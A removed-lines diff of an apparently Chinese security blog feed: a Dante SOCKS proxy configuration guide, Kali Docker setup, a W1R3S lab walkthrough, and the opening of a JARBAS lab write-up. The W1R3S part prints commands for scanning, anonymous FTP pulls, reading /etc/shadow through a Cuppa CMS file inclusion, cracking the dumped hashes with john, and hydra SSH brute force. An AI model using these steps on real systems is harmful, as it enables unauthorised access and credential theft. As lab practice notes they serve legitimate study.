-<h2 id="重要配置解读">2、重要配置解读</h2>
-<p>官网主页：<a
-href="http://www.inet.no/dante/doc/1.4.x/config/index.html">Dante官方配置</a></p>
-<p>服务器设置</p>
-<figure class="highlight pgsql"><table><tr><td class="code"><pre><code class="hljs pgsql">logoutput		日志输出位置，可以使用stdout/文件名<br>				注意: danted的日志不支持输出到/var/<span class="hljs-keyword">log</span>目录下，官网的配置文档有误<br>					 建议的形式是在根目录下额外开一个/danted目录来做日志文件夹<br>				参考链接:https://www.linuxquestions.org/questions/linux-software<span class="hljs-number">-2</span>/dante-socks-<span class="hljs-keyword">server</span>-<span class="hljs-keyword">not</span>-running-<span class="hljs-keyword">as</span>-root-<span class="hljs-keyword">no</span>-<span class="hljs-keyword">access</span>-<span class="hljs-keyword">to</span>-var-<span class="hljs-keyword">log</span><span class="hljs-number">-4175674993</span>/<br><br><span class="hljs-type">internal</span>		用于指定代理服务器监听的接口（或地址）和端口。<br>				即客户端连接的地址，可以使用IP或者网卡(如eth0)来代指<br><br><span class="hljs-keyword">external</span>		用于指定代理服务器向目标服务器发起连接的接口<br>				可以使用IP或者网卡名称来指代<br>			<br>socksmethod		socks代理服务采用的身份认证方式<br><br>clientmethod	客户端连接时采用的身份认证（不设置即可）<br><br><span class="hljs-keyword">user</span>.privileged	需要使用特权的时候，使用的用户权限<br><span class="hljs-keyword">user</span>.unprivileged 不需要特权的时候，使用的用户权限<br><br></code></pre></td></tr></table></figure>
-<p>流量设置</p>
-<p>client
-pass，默认采用正向代理方式，控制哪些客户端可以连接（类似防火墙的访问控制列表），一般直接放行即可。</p>
-<figure class="highlight applescript"><table><tr><td class="code"><pre><code class="hljs applescript">client pass &#123;<br>        <span class="hljs-keyword">from</span>: <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>/<span class="hljs-number">0</span> <span class="hljs-keyword">to</span>: <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>/<span class="hljs-number">0</span><br>        <span class="hljs-built_in">log</span>: <span class="hljs-keyword">error</span> <span class="hljs-comment"># connect disconnect tcpinfo iooperation</span><br>&#125;<br></code></pre></td></tr></table></figure>
-<p>socks pass，默认采用正向代理方式，控制客户端和目标服务器的白名单</p>
-<figure class="highlight applescript"><table><tr><td class="code"><pre><code class="hljs applescript">socks pass &#123;<br>    <span class="hljs-keyword">from</span>: <span class="hljs-number">192.168</span><span class="hljs-number">.166</span><span class="hljs-number">.0</span>/<span class="hljs-number">24</span> <span class="hljs-keyword">to</span>: www.ichunqiu.com<br>    <span class="hljs-built_in">log</span>: <span class="hljs-keyword">error</span> connect disconnect <span class="hljs-comment"># tcpinfo </span><br>&#125;<br></code></pre></td></tr></table></figure>
-<p>日志设置</p>
-<p>在client pass和socks
-pass中，默认输出的日志是info，不需要额外的设置。</p>
-<p>当然也可以自己选择增加error、connect、disconnect、tcpinfo、iooperation这五个种额外输出。</p>
-<h2 id="配置文件样例">3、配置文件样例</h2>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs conf">#日志保存位置<br>errorlog: syslog<br>logoutput: /danted/sockd.log<br><br>#特权&amp;非特权<br>user.privileged: root<br>user.unprivileged: nobody<br><br>internal: 0.0.0.0 port = 1080<br>external: 10.255.200.72<br><br># method: username<br>socksmethod: username<br><br>#允许来自内部的用户访问dante代理服务器<br>client pass &#123;<br>        from: 0.0.0.0/0 to: 0.0.0.0/0<br>        log: error # connect disconnect tcpinfo iooperation<br>&#125;<br><br>#允许访问的外部指定地址<br>socks pass &#123;<br>    from: 192.168.166.0/24 to: www.ichunqiu.com<br>    log: error connect disconnect # tcpinfo <br>&#125;<br></code></pre></td></tr></table></figure>
-<h2 id="日志切割">4、日志切割</h2>
-<p>日志切割采用定时任务完成</p>
-<figure class="highlight basic"><table><tr><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">0 </span>* * * * /bin/bash -c <span class="hljs-string">&quot;/danted/daily_log.sh&quot;</span><br></code></pre></td></tr></table></figure>
-<p>对应的daily_log.sh的文件内容</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">!/bin/bash</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> 设置日志文件路径</span><br>log_file=&quot;/danted/sockd.log&quot;<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> 获取当前日期</span><br>current_date=$(date +&quot;%Y-%m-%d&quot;)<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> 设置保存目录</span><br>log_dir=&quot;/danted&quot;<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> 构建新的日志文件名</span><br>new_log_file=&quot;$log_dir/sockd_$current_date.log&quot;<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> 检查日志目录是否存在，如果不存在则创建</span><br>if [ ! -d &quot;$log_dir&quot; ]; then<br>    mkdir -p &quot;$log_dir&quot;<br>fi<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> 判断日志文件是否存在</span><br>if [ -f &quot;$log_file&quot; ]; then<br>    # 备份并重命名日志文件<br>    cp &quot;$log_file&quot; &quot;$new_log_file&quot;<br>    # 清空原日志文件<br>    echo &quot;&quot; &gt; &quot;$log_file&quot;<br>fi<br></code></pre></td></tr></table></figure>
-<h2 id="小尾巴">5、小尾巴</h2>
-<p>当然上面还留了一个问题，danted
-的访问控制基于IP而不是用户。danted本身无法根据用户身份实现对目标服务器的访问控制。</p>
-<p>比如我希望A用户只能通行www.baidu.com，B用户只能通行www.qq.com，这个danted目前是做不到的，除非A、B用户的IP是固定的。</p>
-]]></content>
-      <categories>
-        <category>杂项</category>
-      </categories>
-      <tags>
-        <tag>代理</tag>
-        <tag>socks5</tag>
-        <tag>服务器</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>kali2021 docker安装配置</title>
-    <url>/2023/09/06/blog0035-kali2021-docker%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/</url>
-    <content><![CDATA[<p>记录一下kali 2021的docker安装过程</p>
-<p>后续持续更新一些docker常用的命令</p>
-<span id="more"></span>
-<h2 id="安装证书-https-dirmngr">1、安装证书 https dirmngr</h2>
-<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">apt-get update <br>apt-get install -y apt-transport-https ca-certificates <br>apt-get install dirmngr<br></code></pre></td></tr></table></figure>
-<h2 id="密钥与更新源">2、密钥与更新源</h2>
-<p>echo可能会权限不够，可以先切换到root用户完成该命令</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">curl -fsSL https://mirrors.tuna.tsinghua.edu.cn/docker-ce/linux/debian/gpg | sudo apt-key add -<br>echo &#x27;deb https://mirrors.tuna.tsinghua.edu.cn/docker-ce/linux/debian/ buster stable&#x27; | sudo tee /etc/apt/sources.list.d/docker.list<br></code></pre></td></tr></table></figure>
-<h2 id="安装docker">3、安装docker</h2>
-<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">apt install docker.io<br></code></pre></td></tr></table></figure>
-<h2 id="用户添加docker组">4、用户添加docker组</h2>
-<p>将kali用户添加至docker组</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">sudo usermod -aG docker kali<br></code></pre></td></tr></table></figure>
-<p>添加完之后记得重新登录，比如注销再登录</p>
-<h2 id="检查安装">5、检查安装</h2>
-<figure class="highlight ebnf"><table><tr><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">systemctl status docker</span><br><span class="hljs-attribute">docker -v</span><br></code></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>杂项</category>
-      </categories>
-      <tags>
-        <tag>docker</tag>
-        <tag>kali</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>靶场笔记-w1r3s</title>
-    <url>/2023/10/22/blog0037-%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0-w1r3s/</url>
-    <content><![CDATA[<p>本篇涉及：nmap的精细化使用、ftp的拉取文件使用、Cuppa
-CMS攻击、shadow文件破解、sudo提权</p>
-<span id="more"></span>
-<h2 id="信息收集">信息收集</h2>
-<h3 id="主机发现">主机发现</h3>
-<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">nmap -sn 192.168.80.0/24<br></code></pre></td></tr></table></figure>
-<p>扫描结果</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">Starting Nmap 7.91 ( https://nmap.org ) at 2023-10-21 12:51 EDT<br>Nmap scan report for 192.168.80.1<br>Host is up (0.00011s latency).<br>MAC Address: 00:50:56:C0:00:08 (VMware)<br>Nmap scan report for 192.168.80.2<br>Host is up (0.000099s latency).<br>MAC Address: 00:50:56:E1:27:10 (VMware)<br>Nmap scan report for 192.168.80.146<br>Host is up (0.00058s latency).<br>MAC Address: 00:0C:29:97:9F:F8 (VMware)<br>Nmap scan report for 192.168.80.254<br>Host is up (0.00015s latency).<br>MAC Address: 00:50:56:F0:75:31 (VMware)<br>Nmap scan report for 192.168.80.128<br>Host is up.<br>Nmap done: 256 IP addresses (5 hosts up) scanned in 1.98 seconds<br></code></pre></td></tr></table></figure>
-<p>发现存在主机192.168.80.146</p>
-<h3 id="端口扫描">端口扫描</h3>
-<h4 id="tcp扫描">TCP扫描</h4>
-<p><code>-sT</code>准确率更高，默认参数为<code>-sS</code>（SYN快速扫描）速度更快。</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">sudo nmap -sT --min-rate 10000 -p- 192.168.80.146 -oA nmapscan/ports<br></code></pre></td></tr></table></figure>
-<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">Nmap 7.91 scan initiated Sat Oct 21 12:58:17 2023 as: nmap -sT --min-rate 10000 -p- -oA nmapscan/ports 192.168.80.146<br>Nmap scan report for 192.168.80.146<br>Host is up (0.00052s latency).<br>Not shown: 55528 filtered ports, 10003 closed ports<br>PORT     STATE SERVICE<br>21/tcp   open  ftp<br>22/tcp   open  ssh<br>80/tcp   open  http<br>3306/tcp open  mysql<br>MAC Address: 00:0C:29:97:9F:F8 (VMware)<br><br>Nmap done at Sat Oct 21 12:58:29 2023 -- 1 IP address (1 host up) scanned in 12.41 seconds<br><br></code></pre></td></tr></table></figure>
-<p>获取端口服务的具体信息</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> 将获取到的ports格式化管理</span><br>ports=$(grep open ports.nmap | awk -F &#x27;/&#x27; &#x27;&#123;print $1&#125;&#x27; | paste -sd &#x27;,&#x27;)<br><span class="hljs-meta">#</span><span class="bash"> 用默认的脚本扫描获取对应的端口版本</span><br>sudo nmap -sT -sV -sC -O 192.168.80.146 -p$ports -oA nampscan/ports_detail<br></code></pre></td></tr></table></figure>
-<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">Nmap scan report for 192.168.80.146<br>Host is up (0.00034s latency).<br><br>PORT     STATE SERVICE VERSION<br>21/tcp   open  ftp     vsftpd 2.0.8 or later<br>| ftp-syst: <br>|   STAT: <br>| FTP server status:<br>|      Connected to ::ffff:192.168.80.128<br>|      Logged in as ftp<br>|      TYPE: ASCII<br>|      No session bandwidth limit<br>|      Session timeout in seconds is 300<br>|      Control connection is plain text<br>|      Data connections will be plain text<br>|      At session startup, client count was 4<br>|      vsFTPd 3.0.3 - secure, fast, stable<br>|_End of status<br>| ftp-anon: Anonymous FTP login allowed (FTP code 230)<br>| drwxr-xr-x    2 ftp      ftp          4096 Jan 23  2018 content<br>| drwxr-xr-x    2 ftp      ftp          4096 Jan 23  2018 docs<br>|_drwxr-xr-x    2 ftp      ftp          4096 Jan 28  2018 new-employees<br>22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey: <br>|   2048 07:e3:5a:5c:c8:18:65:b0:5f:6e:f7:75:c7:7e:11:e0 (RSA)<br>|   256 03:ab:9a:ed:0c:9b:32:26:44:13:ad:b0:b0:96:c3:1e (ECDSA)<br>|_  256 3d:6d:d2:4b:46:e8:c9:a3:49:e0:93:56:22:2e:e3:54 (ED25519)<br>80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))<br>|_http-server-header: Apache/2.4.18 (Ubuntu)<br>|_http-title: Apache2 Ubuntu Default Page: It works<br>3306/tcp open  mysql   MySQL (unauthorized)<br>MAC Address: 00:0C:29:97:9F:F8 (VMware)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device type: general purpose|storage-misc<br>Running (JUST GUESSING): Linux 3.X|4.X|5.X|2.6.X (97%), Synology DiskStation Manager 5.X (90%), Netgear RAIDiator 4.X (87%)<br>OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5.1 cpe:/o:linux:linux_kernel:2.6.32 cpe:/a:synology:diskstation_manager:5.2 cpe:/o:netgear:raidiator:4.2.28<br>Aggressive OS guesses: Linux 3.10 - 4.11 (97%), Linux 3.2 - 4.9 (97%), Linux 5.1 (97%), Linux 3.13 - 3.16 (91%), Linux 3.16 - 4.6 (91%), Linux 4.10 (91%), Linux 4.4 (91%), Linux 2.6.32 (91%), Linux 3.4 - 3.10 (91%), Linux 4.15 - 5.8 (91%)<br>No exact OS matches for host (test conditions non-ideal).<br>Network Distance: 1 hop<br>Service Info: Host: W1R3S.inc; OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap done: 1 IP address (1 host up) scanned in 20.59 seconds<br><br></code></pre></td></tr></table></figure>
-<h4 id="udp扫描">UDP扫描</h4>
-<p>刚刚使用的TCP扫描，此处改为使用UDP扫描</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">sudo nmap -sU --top-ports 20 192.168.80.146 -oA nmapscan/udp_ports<br></code></pre></td></tr></table></figure>
-<h4 id="漏洞扫描">漏洞扫描</h4>
-<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">sudo nmap --script=vuln -p21,22,80,3306 192.168.80.146 -oA nmapscan/vuln<br></code></pre></td></tr></table></figure>
-<h4 id="全扫描">全扫描</h4>
-<figure class="highlight dns"><table><tr><td class="code"><pre><code class="hljs dns">sudo nmap -<span class="hljs-keyword">A</span> <span class="hljs-number">192.168.80.146</span><br></code></pre></td></tr></table></figure>
-<h2 id="ftp攻击">ftp攻击</h2>
-<h3 id="ftp信息收集">ftp信息收集</h3>
-<p>注意到ftp支持匿名登陆。</p>
-<p>ftp支持匿名登录，一般可以尝试ftp/anonymous作为用户名，空密码或者电子邮箱作为密码来进行登陆。</p>
-<p>使用ftp/空密码登录，果然进去了</p>
-<p><img
-src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0037/image-20231022002909828.png"
-alt="image-20231022002909828" /></p>
-<p>全部拉取</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">wget ftp://192.168.80.146:21/* --ftp-user=ftp --ftp-password=&quot;&quot; -r<br></code></pre></td></tr></table></figure>
-<p>也可以进入ftp内部拉取</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">binary // 启动二进制模式，尤其是拉取可执行文件<br>mget * // 拉取当前目录下的所有文件，不包含子目录文件<br>prompt // 关闭ftp的交互界面，拉取文件的时候不会提醒<br></code></pre></td></tr></table></figure>
-<p>拉取了文件，有一个员工名单，但是一时也看不出来存在什么问题。</p>
-<figure class="highlight stylus"><table><tr><td class="code"><pre><code class="hljs stylus">The W1R3S<span class="hljs-selector-class">.inc</span> employee list<br><br>Naomi<span class="hljs-selector-class">.W</span> - Manager<br>Hector<span class="hljs-selector-class">.A</span> - IT Dept<br>Joseph<span class="hljs-selector-class">.G</span> - Web Design<br>Albert<span class="hljs-selector-class">.O</span> - Web Design<br>Gina<span class="hljs-selector-class">.L</span> - Inventory<br>Rico<span class="hljs-selector-class">.D</span> - Human Resource<br></code></pre></td></tr></table></figure>
-<h2 id="mysql攻击">MySQL攻击</h2>
-<p>尝试远程登陆</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">mysql -h 192.168.80.146 -P3306 -uroot -p<br></code></pre></td></tr></table></figure>
-<p>报错显示不允许远程登陆</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">ERROR 1130 (HY000): Host &#x27;192.168.80.128&#x27; is not allowed to connect to this MySQL server<br></code></pre></td></tr></table></figure>
-<h2 id="http攻击">HTTP攻击</h2>
-<p>访问80端口，发现也是默认的Apache页面。</p>
-<h3 id="扫描目录">扫描目录</h3>
-<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">python dirsearch -u http://192.168.80.146<br>sudo gobuster -u http://192.168.80.146 --wordlist=/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt <br></code></pre></td></tr></table></figure>
-<p>扫描发现存在Cuppa CMS的安装界面</p>
-<p><img
-src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0037/image-20231022153945481.png"
-alt="image-20231022153945481" /></p>
-<p>尝试搜索Cuppa CMS的历史漏洞，这里发现存在确实存在 : <a
-href="https://www.exploit-db.com/exploits/25971">Cuppa
-CMS文件包含</a></p>
-<p>通过文件包含读取到<code>/etc/shadow</code>文件</p>
-<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">root</span>:$<span class="hljs-number">6</span>$vYcecPCy$JNbK.hr<span class="hljs-number">7</span>HU<span class="hljs-number">72</span>ifLxmjpIP<span class="hljs-number">9</span>kTcx./ak<span class="hljs-number">2</span>MM<span class="hljs-number">3</span>lBs.Ouiu<span class="hljs-number">0</span>mENav<span class="hljs-number">72</span>TfQIs<span class="hljs-number">8</span>h<span class="hljs-number">1</span>jPm<span class="hljs-number">2</span>rwRFqd<span class="hljs-number">87</span>HDC<span class="hljs-number">0</span>pi<span class="hljs-number">7</span>gn<span class="hljs-number">9</span>t<span class="hljs-number">7</span>VgZ<span class="hljs-number">0</span>:<span class="hljs-number">17554</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">daemon</span>:*:<span class="hljs-number">17379</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">bin</span>:*:<span class="hljs-number">17379</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">sys</span>:*:<span class="hljs-number">17379</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">sync</span>:*:<span class="hljs-number">17379</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">games</span>:*:<span class="hljs-number">17379</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">man</span>:*:<span class="hljs-number">17379</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">lp</span>:*:<span class="hljs-number">17379</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">mail</span>:*:<span class="hljs-number">17379</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">news</span>:*:<span class="hljs-number">17379</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">uucp</span>:*:<span class="hljs-number">17379</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">proxy</span>:*:<span class="hljs-number">17379</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">www</span>-data:$<span class="hljs-number">6</span>$<span class="hljs-number">8</span>JMxE<span class="hljs-number">7</span>l<span class="hljs-number">0</span>$yQ<span class="hljs-number">16</span>jM..ZsFxpoGue<span class="hljs-number">8</span>/<span class="hljs-number">0</span>LBUnTas<span class="hljs-number">23</span>zaOqg<span class="hljs-number">2</span>Da<span class="hljs-number">47</span>vmykGTANfutzM<span class="hljs-number">8</span>MuFidtb<span class="hljs-number">0</span>..Zk.TUKDoDAVRCoXiZAH.Ud<span class="hljs-number">1</span>:<span class="hljs-number">17560</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">backup</span>:*:<span class="hljs-number">17379</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">list</span>:*:<span class="hljs-number">17379</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">irc</span>:*:<span class="hljs-number">17379</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">gnats</span>:*:<span class="hljs-number">17379</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">nobody</span>:*:<span class="hljs-number">17379</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">systemd</span>-timesync:*:<span class="hljs-number">17379</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">systemd</span>-network:*:<span class="hljs-number">17379</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">systemd</span>-resolve:*:<span class="hljs-number">17379</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">systemd</span>-bus-proxy:*:<span class="hljs-number">17379</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">syslog</span>:*:<span class="hljs-number">17379</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">_apt</span>:*:<span class="hljs-number">17379</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">messagebus</span>:*:<span class="hljs-number">17379</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">uuidd</span>:*:<span class="hljs-number">17379</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">lightdm</span>:*:<span class="hljs-number">17379</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">whoopsie</span>:*:<span class="hljs-number">17379</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">avahi</span>-autoipd:*:<span class="hljs-number">17379</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">avahi</span>:*:<span class="hljs-number">17379</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">dnsmasq</span>:*:<span class="hljs-number">17379</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">colord</span>:*:<span class="hljs-number">17379</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">speech</span>-dispatcher:!:<span class="hljs-number">17379</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">hplip</span>:*:<span class="hljs-number">17379</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">kernoops</span>:*:<span class="hljs-number">17379</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">pulse</span>:*:<span class="hljs-number">17379</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">rtkit</span>:*:<span class="hljs-number">17379</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">saned</span>:*:<span class="hljs-number">17379</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">usbmux</span>:*:<span class="hljs-number">17379</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">w1r3s</span>:$<span class="hljs-number">6</span>$xe/eyoTx$gttdIYrxrstpJP<span class="hljs-number">97</span>hWqttvc<span class="hljs-number">5</span>cGzDNyMb<span class="hljs-number">0</span>vSuppux<span class="hljs-number">4</span>f<span class="hljs-number">2</span>CcBv<span class="hljs-number">3</span>FwOt<span class="hljs-number">2</span>P<span class="hljs-number">1</span>GFLjZdNqjwRuP<span class="hljs-number">3</span>eUjkgb/io<span class="hljs-number">7</span>x<span class="hljs-number">9</span>q<span class="hljs-number">1</span>iP.:<span class="hljs-number">17567</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">sshd</span>:*:<span class="hljs-number">17554</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">ftp</span>:*:<span class="hljs-number">17554</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">mysql</span>:!:<span class="hljs-number">17554</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br></code></pre></td></tr></table></figure>
-<h2 id="john破解shadow">John破解shadow</h2>
-<p>拿到了shadow文件之后，尝试获取密码的明文，这里我们可以使用john工具</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">echo &#x27;w1r3s:$6$xe/eyoTx$gttdIYrxrstpJP97hWqttvc5cGzDNyMb0vSuppux4f2CcBv3FwOt2P1GFLjZdNqjwRuP3eUjkgb/io7x9q1iP.:17567:0:99999:7:::&#x27; &gt; shadow.txt<br>john shadow.txt<br></code></pre></td></tr></table></figure>
-<p>获得了w1r3s用户的密码为：computer</p>
-<h2 id="sudoers配置">Sudoers配置</h2>
-<p>使用w1r3s的用户名密码ssh登录靶机，成功拿到了shell</p>
-<p><img
-src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0037/image-20231022172735428.png"
-alt="image-20231022172735428" /></p>
-<p>id命令查看当前w1r3s用户的权限，发现存在sudo权限</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">uid=1000(w1r3s) gid=1000(w1r3s) groups=1000(w1r3s),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)<br></code></pre></td></tr></table></figure>
-<h2 id="ssh暴力破解补充">SSH暴力破解（补充）</h2>
-<p>使用hydra</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">hydra -L users.list -P /usr/share/wordlists/rockyou.txt ssh://192.168.80.146 -t 4<br></code></pre></td></tr></table></figure>
-<p>也可以使用msf</p>
-<h2 id="总结">总结</h2>
-<p>1、Nmap扫描技巧</p>
-<p>2、ftp基本使用</p>
-<p>3、John破解shadow</p>
-<p>4、sudo提权</p>
-]]></content>
-      <categories>
-        <category>攻防实战</category>
-        <category>靶场笔记</category>
-      </categories>
-      <tags>
-        <tag>pentest</tag>
-        <tag>nmap</tag>
-        <tag>ftp</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>靶场笔记-JARBAS</title>
-    <url>/2023/10/22/blog0038-%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0-JARBAS/</url>
-    <content><![CDATA[<p>本篇涉及Jenkins任意命令执行，Crontab提权</p>
-<span id="more"></span>
-<h2 id="主机扫描">主机扫描</h2>
-<p>找到目标主机192.168.80.147</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">nmap -sn 192.168.80.0/24<br>Starting Nmap 7.91 ( https://nmap.org ) at 2023-10-22 06:41 EDT<br>Nmap scan report for 192.168.80.2<br>Host is up (0.00057s latency).<br>Nmap scan report for 192.168.80.128<br>Host is up (0.00086s latency).<br>Nmap scan report for 192.168.80.147<br>Host is up (0.0022s latency).<br>Nmap done: 256 IP addresses (3 hosts up) scanned in 3.12 seconds<br></code></pre></td></tr></table></figure>
-<h2 id="端口扫描">端口扫描</h2>
-<h3 id="tcp扫描">TCP扫描</h3>
